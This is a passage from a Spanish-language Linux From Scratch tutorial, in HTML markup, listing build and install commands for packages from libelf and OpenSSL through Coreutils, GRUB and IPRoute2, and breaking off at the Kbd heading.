&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./configure &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr &lt;span class=&quot;nt&quot;&gt;--disable-debuginfod&lt;/span&gt;

make
make check &lt;span class=&quot;c&quot;&gt;# Es posible que salgan errores, pero no hay de qué preocuparse&lt;/span&gt;

make &lt;span class=&quot;nt&quot;&gt;-C&lt;/span&gt; libelf &lt;span class=&quot;nb&quot;&gt;install
install&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-vm644&lt;/span&gt; config/libelf.pc /usr/lib/pkgconfig
&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; /usr/lib/libelf.a
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.&lt;/p&gt;

&lt;h5 id=&quot;libffi-en-lfs&quot;&gt;Libffi en LFS&lt;/h5&gt;

&lt;p&gt;Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./configure &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr &lt;span class=&quot;nt&quot;&gt;--disable-static&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--with-gcc-arch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;native

make
make check &lt;span class=&quot;c&quot;&gt;# Es posible que salgan errores, pero no hay de qué preocuparse&lt;/span&gt;
make &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.&lt;/p&gt;

&lt;h5 id=&quot;openssl-en-lfs&quot;&gt;Openssl en LFS&lt;/h5&gt;

&lt;p&gt;Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./config &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr         &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
         &lt;span class=&quot;nt&quot;&gt;--openssldir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/etc/ssl &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
         &lt;span class=&quot;nt&quot;&gt;--libdir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;lib          &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
         shared                &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
         zlib-dynamic

make
make &lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Es posible que nos salgan fallos, pero no hay de qué preocuparse&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/INSTALL_LIBS/s/libcrypto.a libssl.a//'&lt;/span&gt; Makefile
make &lt;span class=&quot;nv&quot;&gt;MANSUFFIX&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;ssl &lt;span class=&quot;nb&quot;&gt;install

mv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; /usr/share/doc/openssl /usr/share/doc/openssl-1.1.1d
&lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-vfr&lt;/span&gt; doc/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; /usr/share/doc/openssl-1.1.1d
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.&lt;/p&gt;

&lt;h5 id=&quot;python3-en-lfs&quot;&gt;Python3 en LFS&lt;/h5&gt;

&lt;p&gt;Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./configure &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr       &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--enable-shared&lt;/span&gt;     &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--with-system-expat&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--with-system-ffi&lt;/span&gt;   &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--with-ensurepip&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;yes

&lt;/span&gt;make
make &lt;span class=&quot;nb&quot;&gt;install

&lt;/span&gt;make &lt;span class=&quot;nb&quot;&gt;install
chmod&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; 755 /usr/lib/libpython3.8.so
&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; 755 /usr/lib/libpython3.so
&lt;span class=&quot;nb&quot;&gt;ln&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sfv&lt;/span&gt; pip3.8 /usr/bin/pip3

&lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-dm755&lt;/span&gt; /usr/share/doc/python-3.8.1/html 

&lt;span class=&quot;nb&quot;&gt;tar&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--strip-components&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1  &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--no-same-owner&lt;/span&gt;       &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--no-same-permissions&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;-C&lt;/span&gt; /usr/share/doc/python-3.8.1/html &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;-xvf&lt;/span&gt; ../python-3.8.1-docs-html.tar.bz2
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.&lt;/p&gt;

&lt;h5 id=&quot;ninja-en-lfs&quot;&gt;Ninja en LFS&lt;/h5&gt;

&lt;p&gt;Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;NINJAJOBS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4

&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/int Guess/a \
  int   j = 0;\
  char* jobs = getenv( &quot;NINJAJOBS&quot; );\
  if ( jobs != NULL ) j = atoi( jobs );\
  if ( j &amp;gt; 0 ) return j;\
'&lt;/span&gt; src/ninja.cc

python3 configure.py &lt;span class=&quot;nt&quot;&gt;--bootstrap&lt;/span&gt;

./ninja ninja_test
./ninja_test &lt;span class=&quot;nt&quot;&gt;--gtest_filter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-SubprocessTest&lt;/span&gt;.SetWithLots

&lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-vm755&lt;/span&gt; ninja /usr/bin/
&lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-vDm644&lt;/span&gt; misc/bash-completion /usr/share/bash-completion/completions/ninja
&lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-vDm644&lt;/span&gt; misc/zsh-completion  /usr/share/zsh/site-functions/_ninja
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.&lt;/p&gt;

&lt;h5 id=&quot;meson-en-lfs&quot;&gt;Meson en LFS&lt;/h5&gt;

&lt;p&gt;Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 setup.py build

python3 setup.py &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--root&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;dest
&lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-rv&lt;/span&gt; dest/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; /
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.&lt;/p&gt;

&lt;h5 id=&quot;coreutils-en-lfs&quot;&gt;Coreutils en LFS&lt;/h5&gt;

&lt;p&gt;Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;patch &lt;span class=&quot;nt&quot;&gt;-Np1&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; ../coreutils-8.31-i18n-1.patch

&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/test.lock/s/^/#/'&lt;/span&gt; gnulib-tests/gnulib.mk

autoreconf &lt;span class=&quot;nt&quot;&gt;-fiv&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;FORCE_UNSAFE_CONFIGURE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 ./configure &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr            &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--enable-no-install-program&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;kill&lt;/span&gt;,uptime

make
make &lt;span class=&quot;nv&quot;&gt;NON_ROOT_USERNAME&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;nobody check-root

&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;dummy:x:1000:nobody&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; /etc/group
&lt;span class=&quot;nb&quot;&gt;chown&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Rv&lt;/span&gt; nobody &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 

su nobody &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; /bin/bash &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
          &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;PATH=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$PATH&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; make RUN_EXPENSIVE_TESTS=yes check&quot;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Es posible que aparezcan errores, pero no hay de qué preocuparse&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/dummy/d'&lt;/span&gt; /etc/group

make &lt;span class=&quot;nb&quot;&gt;install

mv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; /usr/bin/&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt;,chgrp,chmod,chown,cp,date,dd,df,echo&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; /bin
&lt;span class=&quot;nb&quot;&gt;mv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; /usr/bin/&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;,ln,ls,mkdir,mknod,mv,pwd,rm&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; /bin
&lt;span class=&quot;nb&quot;&gt;mv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; /usr/bin/&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;rmdir&lt;/span&gt;,stty,sync,true,uname&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; /bin
&lt;span class=&quot;nb&quot;&gt;mv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; /usr/bin/chroot /usr/sbin
&lt;span class=&quot;nb&quot;&gt;mv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; /usr/share/man/man1/chroot.1 /usr/share/man/man8/chroot.8
&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; s/&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;1&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;/&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;8&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;/1 /usr/share/man/man8/chroot.8

&lt;span class=&quot;nb&quot;&gt;mv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; /usr/bin/&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt;,nice,sleep,touch&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; /bin
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.&lt;/p&gt;

&lt;h5 id=&quot;check-en-lfs&quot;&gt;Check en LFS&lt;/h5&gt;

&lt;p&gt;Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./configure &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr
make
make check

make &lt;span class=&quot;nv&quot;&gt;docdir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/share/doc/check-0.14.0 &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'1 s/tools/usr/'&lt;/span&gt; /usr/bin/checkmk
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.&lt;/p&gt;

&lt;h5 id=&quot;diffutils-en-lfs&quot;&gt;Diffutils en LFS&lt;/h5&gt;

&lt;p&gt;Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./configure &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr

make
make check
make &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.&lt;/p&gt;

&lt;h5 id=&quot;gawk-en-lfs&quot;&gt;Gawk en LFS&lt;/h5&gt;

&lt;p&gt;Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s/extras//'&lt;/span&gt; Makefile.in

./configure &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr

make
make check
make &lt;span class=&quot;nb&quot;&gt;install

mkdir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; /usr/share/doc/gawk-5.0.1
&lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt;    &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; doc/&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;awkforai.txt,&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;eps,pdf,jpg&lt;span class=&quot;o&quot;&gt;}}&lt;/span&gt; /usr/share/doc/gawk-5.0.1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.&lt;/p&gt;

&lt;h5 id=&quot;findutils-en-lfs&quot;&gt;Findutils en LFS&lt;/h5&gt;

&lt;p&gt;Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./configure &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr &lt;span class=&quot;nt&quot;&gt;--localstatedir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/var/lib/locate

make
make check &lt;span class=&quot;c&quot;&gt;# Este comando puede mostrar algunos errores, pero no hay de qué preocuparse&lt;/span&gt;
make &lt;span class=&quot;nb&quot;&gt;install

mv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; /usr/bin/find /bin
&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s|find:=${BINDIR}|find:=/bin|'&lt;/span&gt; /usr/bin/updatedb
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.&lt;/p&gt;

&lt;h5 id=&quot;groff-en-lfs&quot;&gt;Groff en LFS&lt;/h5&gt;

&lt;p&gt;Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;PAGE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;A4 ./configure &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr
make &lt;span class=&quot;nt&quot;&gt;-j1&lt;/span&gt;
make &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.&lt;/p&gt;

&lt;h5 id=&quot;grub-en-lfs&quot;&gt;GRUB en LFS&lt;/h5&gt;

&lt;p&gt;Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./configure &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr          &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--sbindir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/sbin        &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--sysconfdir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/etc      &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--disable-efiemu&lt;/span&gt;       &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--disable-werror&lt;/span&gt;

make
make &lt;span class=&quot;nb&quot;&gt;install

mv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; /etc/bash_completion.d/grub /usr/share/bash-completion/completions
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.&lt;/p&gt;

&lt;h5 id=&quot;less-en-lfs&quot;&gt;Less en LFS&lt;/h5&gt;

&lt;p&gt;Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./configure &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr &lt;span class=&quot;nt&quot;&gt;--sysconfdir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/etc

make
make &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.&lt;/p&gt;

&lt;h5 id=&quot;gzip-en-lfs&quot;&gt;Gzip en LFS&lt;/h5&gt;

&lt;p&gt;Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./configure &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr

make
make check &lt;span class=&quot;c&quot;&gt;# Es posible que aparezcan fallos, pero no hay de qué preocuparse&lt;/span&gt;
make &lt;span class=&quot;nb&quot;&gt;install

mv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; /usr/bin/gzip /bin
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.&lt;/p&gt;

&lt;h5 id=&quot;zstd-en-lfs&quot;&gt;Zstd en LFS&lt;/h5&gt;

&lt;p&gt;Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;make
make &lt;span class=&quot;nv&quot;&gt;prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr &lt;span class=&quot;nb&quot;&gt;install

rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; /usr/lib/libzstd.a
&lt;span class=&quot;nb&quot;&gt;mv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; /usr/lib/libzstd.so.&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; /lib
&lt;span class=&quot;nb&quot;&gt;ln&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sfv&lt;/span&gt; ../../lib/&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;readlink&lt;/span&gt; /usr/lib/libzstd.so&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt; /usr/lib/libzstd.so
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.&lt;/p&gt;

&lt;h5 id=&quot;iproute-en-lfs&quot;&gt;IPRoute en LFS&lt;/h5&gt;

&lt;p&gt;Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; /ARPD/d Makefile
&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-fv&lt;/span&gt; man/man8/arpd.8

&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s/.m_ipt.o//'&lt;/span&gt; tc/Makefile

make
make &lt;span class=&quot;nv&quot;&gt;DOCDIR&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/share/doc/iproute2-5.5.0 &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.&lt;/p&gt;

&lt;h5 id=&quot;kbd-en-lfs&quot;&gt;Kbd en LFS&lt;/h5&gt;

&lt;p&gt;Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:&lt;/p&gt;

